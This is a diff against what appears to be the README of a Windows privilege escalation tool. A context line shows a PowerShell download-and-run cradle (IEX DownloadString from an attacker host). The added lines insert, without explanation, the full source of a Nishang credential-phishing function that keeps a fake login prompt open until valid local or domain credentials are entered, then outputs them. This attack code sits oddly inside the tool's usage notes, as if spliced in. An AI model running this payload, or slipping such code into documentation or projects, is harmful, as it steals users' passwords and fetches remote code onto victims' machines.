@@ -37,6 +37,54 @@ Import the script from a web server.
 C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck" 
 ```
 
+[!](https://i0.wp.com/1.bp.blogspot.com/-vWTZFXpgriQ/XpXLWa3sWUI/AAAAAAAAjjg/BzDVi7-8N9U9mSx8TYYYCeSuAwDKjn2rACLcBGAsYHQ/s1600/19.png)
+
+```
+function Invoke-CredentialsPhish
+{
+<#
+.SYNOPSIS
+Nishang script which opens a user credential prompt.
+
+.DESCRIPTION
+This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.
+
+.EXAMPLE
+PS > Invoke-CredentialsPhish
+
+.LINK
+http://labofapenetrationtester.blogspot.com/
+https://github.com/samratashok/nishang
+#>
+
+[CmdletBinding()]
+Param ()
+
+    $ErrorActionPreference="SilentlyContinue"
+    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
+    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
+    while($true)
+    {
+        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
+        if($credential)
+        {
+            $creds = $credential.GetNetworkCredential()
+            [String]$user = $creds.username
+            [String]$pass = $creds.password
+            [String]$domain = $creds.domain
+            $authlocal = $DS.ValidateCredentials($user, $pass)
+            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
+            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
+            {
+                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
+                $output
+                break
+            }
+        }
+    }
+}
+```
 
 ## Yet another Windows Privilege escalation tool, why?
 
